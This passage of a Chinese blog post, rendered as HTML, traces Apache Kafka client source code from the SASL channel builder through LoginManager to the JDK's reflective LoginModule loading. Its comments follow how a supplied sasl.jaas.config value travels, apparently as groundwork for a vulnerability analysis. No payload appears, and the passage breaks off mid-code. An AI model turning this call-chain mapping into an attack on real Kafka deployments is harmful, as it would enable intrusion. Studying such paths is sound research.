SASL_PLAINTEXT:</span><br><span class="line">            requireNonNullMode(mode, securityProtocol);</span><br><span class="line">            <span class="type">String</span> <span class="variable">sslClientAuthOverride</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            Object jaasContexts;</span><br><span class="line">            <span class="comment">//mode默认为CLIENT进入</span></span><br><span class="line">            <span class="keyword">if</span> (mode != Mode.SERVER) &#123;</span><br><span class="line">                <span class="type">JaasContext</span> <span class="variable">jaasContext</span> <span class="operator">=</span> contextType == Type.CLIENT ? JaasContext.loadClientContext(configs) : JaasContext.loadServerContext(listenerName, clientSaslMechanism, configs);</span><br><span class="line">                jaasContexts = Collections.singletonMap(clientSaslMechanism, jaasContext);</span><br><span class="line">            <span class="comment">//else默认不进入</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                List&lt;String&gt; enabledMechanisms = (List)configs.get(<span class="string">&quot;sasl.enabled.mechanisms&quot;</span>);</span><br><span class="line">                jaasContexts = <span class="keyword">new</span> <span class="title class_">HashMap</span>(enabledMechanisms.size());</span><br><span class="line">                <span class="type">Iterator</span> <span class="variable">var18</span> <span class="operator">=</span> enabledMechanisms.iterator();</span><br><span class="line"></span><br><span class="line">                String listenerClientAuth;</span><br><span class="line">                <span class="keyword">while</span>(var18.hasNext()) &#123;</span><br><span class="line">                    listenerClientAuth = (String)var18.next();</span><br><span class="line">                    ((Map)jaasContexts).put(listenerClientAuth, JaasContext.loadServerContext(listenerName, listenerClientAuth, configs));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (listenerName != <span class="literal">null</span> &amp;&amp; securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">configuredClientAuth</span> <span class="operator">=</span> (String)configs.get(<span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                    listenerClientAuth = (String)config.originalsWithPrefix(listenerName.configPrefix(), <span class="literal">true</span>).get(<span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (listenerClientAuth == <span class="literal">null</span>) &#123;</span><br><span class="line">                        sslClientAuthOverride = SslClientAuth.NONE.name().toLowerCase(Locale.ROOT);</span><br><span class="line">                        <span class="keyword">if</span> (configuredClientAuth != <span class="literal">null</span> &amp;&amp; !configuredClientAuth.equalsIgnoreCase(SslClientAuth.NONE.name())) &#123;</span><br><span class="line">                            log.warn(<span class="string">&quot;Broker configuration &#x27;&#123;&#125;&#x27; is applied only to SSL listeners. Listener-prefixed configuration can be used to enable SSL client authentication for SASL_SSL listeners. In future releases, broker-wide option without listener prefix may be applied to SASL_SSL listeners as well. All configuration options intended for specific listeners should be listener-prefixed.&quot;</span>, <span class="string">&quot;ssl.client.auth&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        	<span class="comment">//channelBuilder为SaslChannelBuilder</span></span><br><span class="line">            channelBuilder = <span class="keyword">new</span> <span class="title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//security.protocol值为PLAINTEXT进入      </span></span><br><span class="line">        <span class="keyword">case</span> PLAINTEXT:</span><br><span class="line">            channelBuilder = <span class="keyword">new</span> <span class="title class_">PlaintextChannelBuilder</span>(listenerName);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//security.protocol值不为以上值进入      </span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unexpected securityProtocol &quot;</span> + securityProtocol);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用channelBuilder).configure()</span></span><br><span class="line">    <span class="comment">//当security.protocol值为SSL   channelBuilder为SslChannelBuilder类</span></span><br><span class="line">    <span class="comment">//当security.protocol值为SASL_SSL、SASL_PLAINTEXT   channelBuilder为SaslChannelBuilder类</span></span><br><span class="line">    <span class="comment">//当security.protocol值不为以上值   channelBuilder为IllegalArgumentException类</span></span><br><span class="line">    ((ChannelBuilder)channelBuilder).configure(configs);</span><br><span class="line">    <span class="keyword">return</span> (ChannelBuilder)channelBuilder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.kafka.common.network.SaslChannelBuilder#configure()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-10.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> <span class="keyword">throws</span> KafkaException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;String, JaasContext&gt; entry = (Map.Entry)var12.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">mechanism</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">            <span class="comment">//调用至LoginManager#acquireLoginManager()</span></span><br><span class="line">            <span class="type">LoginManager</span> <span class="variable">loginManager</span> <span class="operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);</span><br><span class="line">            <span class="built_in">this</span>.loginManagers.put(mechanism, loginManager);</span><br><span class="line">            <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> loginManager.subject();</span><br><span class="line">            <span class="built_in">this</span>.subjects.put(mechanism, subject);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.mode == Mode.SERVER &amp;&amp; mechanism.equals(<span class="string">&quot;GSSAPI&quot;</span>)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.maybeAddNativeGssapiCredentials(subject);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">            <span class="built_in">this</span>.sslFactory = <span class="keyword">new</span> <span class="title class_">SslFactory</span>(<span class="built_in">this</span>.mode, <span class="built_in">this</span>.sslClientAuthOverride, <span class="built_in">this</span>.isInterBrokerListener);</span><br><span class="line">            <span class="built_in">this</span>.sslFactory.configure(configs);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">        <span class="built_in">this</span>.close();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(var9);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManager()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-11.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-12.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LoginManager <span class="title function_">acquireLoginManager</span><span class="params">(JaasContext jaasContext, String saslMechanism, Class&lt;? extends Login&gt; defaultLoginClass, Map&lt;String, ?&gt; configs)</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Login</span>&gt; loginClass = configuredClassOrDefault(configs, jaasContext, saslMechanism, <span class="string">&quot;sasl.login.class&quot;</span>, defaultLoginClass);</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">AuthenticateCallbackHandler</span>&gt; defaultLoginCallbackHandlerClass = <span class="string">&quot;OAUTHBEARER&quot;</span>.equals(saslMechanism) ? OAuthBearerUnsecuredLoginCallbackHandler.class : AbstractLogin.DefaultLoginCallbackHandler.class;</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">AuthenticateCallbackHandler</span>&gt; loginCallbackClass = configuredClassOrDefault(configs, jaasContext, saslMechanism, <span class="string">&quot;sasl.login.callback.handler.class&quot;</span>, defaultLoginCallbackHandlerClass);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> LoginManager.class;</span><br><span class="line">    <span class="keyword">synchronized</span>(LoginManager.class) &#123;</span><br><span class="line">        <span class="type">Password</span> <span class="variable">jaasConfigValue</span> <span class="operator">=</span> jaasContext.dynamicJaasConfig();</span><br><span class="line">        LoginManager loginManager;</span><br><span class="line">        LoginMetadata loginMetadata;</span><br><span class="line">        <span class="comment">//jaasConfigValue为传入sasl.jaas.config值，不为空</span></span><br><span class="line">        <span class="keyword">if</span> (jaasConfigValue != <span class="literal">null</span>) &#123;</span><br><span class="line">            loginMetadata = <span class="keyword">new</span> <span class="title class_">LoginMetadata</span>(jaasConfigValue, loginClass, loginCallbackClass);</span><br><span class="line">            loginManager = (LoginManager)DYNAMIC_INSTANCES.get(loginMetadata);</span><br><span class="line">            <span class="comment">//loginManager默认为空</span></span><br><span class="line">            <span class="keyword">if</span> (loginManager == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//new LoginManager()</span></span><br><span class="line">                loginManager = <span class="keyword">new</span> <span class="title class_">LoginManager</span>(jaasContext, saslMechanism, configs, loginMetadata);</span><br><span class="line">                DYNAMIC_INSTANCES.put(loginMetadata, loginManager);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            loginMetadata = <span class="keyword">new</span> <span class="title class_">LoginMetadata</span>(jaasContext.name(), loginClass, loginCallbackClass);</span><br><span class="line">            loginManager = (LoginManager)STATIC_INSTANCES.get(loginMetadata);</span><br><span class="line">            <span class="keyword">if</span> (loginManager == <span class="literal">null</span>) &#123;</span><br><span class="line">                loginManager = <span class="keyword">new</span> <span class="title class_">LoginManager</span>(jaasContext, saslMechanism, configs, loginMetadata);</span><br><span class="line">                STATIC_INSTANCES.put(loginMetadata, loginManager);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SecurityUtils.addConfiguredSecurityProviders(configs);</span><br><span class="line">        <span class="keyword">return</span> loginManager.acquire();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.kafka.common.security.authenticator.LoginManager构造方法</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-13.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">LoginManager</span><span class="params">(JaasContext jaasContext, String saslMechanism, Map&lt;String, ?&gt; configs, LoginMetadata&lt;?&gt; loginMetadata)</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line">    <span class="built_in">this</span>.loginMetadata = loginMetadata;</span><br><span class="line">    <span class="built_in">this</span>.login = (Login)Utils.newInstance(loginMetadata.loginClass);</span><br><span class="line">    <span class="built_in">this</span>.loginCallbackHandler = (AuthenticateCallbackHandler)Utils.newInstance(loginMetadata.loginCallbackClass);</span><br><span class="line">    <span class="built_in">this</span>.loginCallbackHandler.configure(configs, saslMechanism, jaasContext.configurationEntries());</span><br><span class="line">    <span class="built_in">this</span>.login.configure(configs, jaasContext.name(), jaasContext.configuration(), <span class="built_in">this</span>.loginCallbackHandler);</span><br><span class="line">    <span class="comment">//调用至login()</span></span><br><span class="line">    <span class="built_in">this</span>.login.login();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.kafka.common.security.kerberos.KerberosLogin#login()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-14.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> LoginContext <span class="title function_">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line">    <span class="built_in">this</span>.lastLogin = <span class="built_in">this</span>.currentElapsedTime();</span><br><span class="line">	<span class="comment">//调用其父类AbstractLogin#login()</span></span><br><span class="line">    <span class="built_in">this</span>.loginContext = <span class="built_in">super</span>.login();</span><br><span class="line">    <span class="built_in">this</span>.subject = <span class="built_in">this</span>.loginContext.getSubject();</span><br><span class="line">    <span class="built_in">this</span>.isKrbTicket = !<span class="built_in">this</span>.subject.getPrivateCredentials(KerberosTicket.class).isEmpty();</span><br><span class="line">    AppConfigurationEntry[] entries = <span class="built_in">this</span>.configuration().getAppConfigurationEntry(<span class="built_in">this</span>.contextName());</span><br><span class="line">    <span class="keyword">if</span> (entries.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.isUsingTicketCache = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.principal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.kafka.common.security.authenticator.AbstractLogin#login()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-15.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> LoginContext <span class="title function_">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line">    <span class="comment">//声明LoginContext</span></span><br><span class="line">    <span class="built_in">this</span>.loginContext = <span class="keyword">new</span> <span class="title class_">LoginContext</span>(<span class="built_in">this</span>.contextName, (Subject)<span class="literal">null</span>, <span class="built_in">this</span>.loginCallbackHandler, <span class="built_in">this</span>.configuration);</span><br><span class="line">    <span class="comment">//调用LoginContext#login()</span></span><br><span class="line">	<span class="built_in">this</span>.loginContext.login();</span><br><span class="line">    log.info(<span class="string">&quot;Successfully logged in.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.loginContext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>javax.security.auth.login.LoginContext#login()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-16.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">    loginSucceeded = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (subject == <span class="literal">null</span>) &#123;</span><br><span class="line">        subject = <span class="keyword">new</span> <span class="title class_">Subject</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// module invoked in doPrivileged</span></span><br><span class="line">        <span class="comment">//LOGIN_METHOD为为login</span></span><br><span class="line">        invokePriv(LOGIN_METHOD);</span><br><span class="line">        invokePriv(COMMIT_METHOD);</span><br><span class="line">        loginSucceeded = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (LoginException le) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            invokePriv(ABORT_METHOD);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LoginException le2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> le;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> le;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>javax.security.auth.login.LoginContext#invokePriv()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-17.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">invokePriv</span><span class="params">(<span class="keyword">final</span> String methodName)</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.security.AccessController.doPrivileged</span><br><span class="line">            (<span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line">                invoke(methodName);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, creatorAcc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (LoginException)pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>javax.security.auth.login.LoginContext#invoke()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-18.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(String methodName)</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// start at moduleIndex</span></span><br><span class="line">    <span class="comment">// - this can only be non-zero if methodName is LOGIN_METHOD</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> moduleIndex; i &lt; moduleStack.length; i++, moduleIndex++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">mIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            Method[] methods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (moduleStack[i].<span class="keyword">module</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">                methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// instantiate the LoginModule</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Allow any object to be a LoginModule as long as it</span></span><br><span class="line">                <span class="comment">// conforms to the interface.</span></span><br><span class="line">                Class&lt;?&gt; c = Class.forName(</span><br><span class="line">                            moduleStack[i].entry.getLoginModuleName(),</span><br><span class="line">                            <span class="literal">true</span>,</span><br><span class="line">                            contextClassLoader);</span><br><span class="line"></span><br><span class="line">                Constructor&lt;?&gt; constructor = c.getConstructor(PARAMS);</span><br><span class="line">                Object[] args = &#123; &#125;;</span><br><span class="line">                moduleStack[i].<span class="keyword">module</span> = constructor.newInstance(args);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// call the LoginModule&#x27;s initialize method</span></span><br><span class="line">                methods = moduleStack[i].<span class="keyword">module</span>.getClass().getMethods();</span><br><span class="line">                <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methods[mIndex].getName().equals(INIT_METHOD)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Object[] initArgs = &#123;subject,</span><br><span class="line">                                    callbackHandler,</span><br><span class="line">                                    state,</span><br><span class="line">                                    moduleStack[i].entry.getOptions() &#125;;</span><br><span class="line">                <span class="comment">// invoke the LoginModule initialize method</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">                <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">                <span class="comment">// the future.</span></span><br><span class="line">                <span class="comment">//invoke调用</span></span><br><span class="line">                methods[mIndex].invoke(moduleStack[i].<span class="keyword">module</span>, initArgs);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// find the requested method in the LoginModule</span></span><br><span class="line">            <span class="keyword">for</span> (mIndex = <span class="number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// set up the arguments to be passed to the LoginModule method</span></span><br><span class="line">            Object[] args = &#123; &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// invoke the LoginModule method</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Throws ArrayIndexOutOfBoundsException if no such</span></span><br><span class="line">            <span class="comment">// method defined.  May improve to use LoginException in</span></span><br><span class="line">            <span class="comment">// the future.</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">status</span> <span class="operator">=</span> 